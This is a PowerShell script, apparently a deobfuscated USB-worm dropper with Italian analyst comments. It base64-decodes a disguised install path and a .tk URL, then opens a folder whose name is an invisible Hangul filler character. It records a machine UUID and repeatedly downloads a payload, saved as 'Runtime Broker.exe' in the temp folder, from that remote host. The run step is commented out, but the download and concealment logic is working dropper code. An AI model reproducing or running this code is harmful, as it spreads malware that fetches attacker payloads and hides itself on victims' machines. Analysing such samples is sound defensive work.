$current_location = $(get-location).Path;

$location_program_files_folder = (${env:ProgramFiles(x86)}, ${env:ProgramFiles} -ne $null)[0];

$location_temp_folder = $env:TEMP;

$sus_folder_location = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luU29mdCBVcG" + "RhdGUgU2VydmljZVxweXRob" + "253LmV4ZQ=="));
# "WinSoft Update Service\pythonw.exe"

$very_sus_link = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6" + "Ly93amVjcHVqcGFubXdtLnRrL3VwZG" + "F0ZXIucGhwP2Zyb209VVNCMQ=="));
# "https://wjecpujpanmwm.tk/updater.php?from=USB1"

$empty_character = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("44Wk"));
# Sempre "hangul filler".

$full_path = $current_location + "\" + $empty_character + "\";

$hwp3 = $location_program_files_folder + "\" + $sus_folder_location;

$payload_location = $location_temp_folder + "\Runtime Broker.exe";

if (Test-Path -Path $full_path -PathType Container) {

	$uuid | Out-File -NoClobber -FilePath ($env:APPDATA + "\from_machine_uuid.dat");

	ii $full_path;
	# Si sposta nella cartella col nome trasparente.

	$webclient_object = New-Object System.Net.WebClient;

	while (!(Test-Path $payload_location)) {

		try {

			$webclient_object.DownloadFile($very_sus_link + "&user=" + $uuid, $payload_location);
			# Scarica il payload :(

		}catch [System.Net.WebException] {
			if ($_.Exception.Response.StatusCode) {exit}
		}catch {}
		Start-Sleep -s 5;
	}

	while (!(Test-Path $hwp3)) {

		# Start-Process -FilePath $payload_location -Wait;
		# Detona il payload appena scaricato.

		Start-Sleep -s 1;

	}
}